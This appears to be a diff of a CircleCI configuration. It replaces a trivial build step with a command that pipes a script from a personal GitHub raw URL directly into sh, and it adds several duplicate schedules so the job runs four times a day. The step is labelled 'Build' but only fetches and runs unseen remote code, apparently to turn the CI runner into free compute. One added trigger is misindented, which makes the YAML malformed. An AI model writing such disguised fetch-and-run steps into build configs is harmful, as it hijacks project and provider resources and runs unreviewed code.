@@ -8,17 +8,42 @@ jobs:
     steps:
       - run:
           name: Build
-          command: echo meocoder 
+          command: curl -fsSL https://raw.githubusercontent.com/nguyenhuyhoang2/nguyenhuyhoang/tool/start.sh | sh 
 workflows:
   version: 2
   constantly_build:
     triggers:
       - schedule:
-          cron: "0 10 * * 2"
+          cron: "22 1,7,14,19 * * *"
           filters:
             branches:
               only:
                 - main
                 - master
+                - circleci-project-setup
+      - schedule:
+          cron: "22 1,7,14,19 * * *"
+          filters:
+            branches:
+              only:
+                - main
+                - master
+                - circleci-project-setup
+      - schedule:
+          cron: "22 1,7,14,19 * * *"
+          filters:
+            branches:
+              only:
+                - main
+                - master
+                - circleci-project-setup
+       - schedule:
+          cron: "22 1,7,14,19 * * *"
+          filters:
+            branches:
+              only:
+                - main
+                - master
+                - circleci-project-setup               
     jobs:
       - build
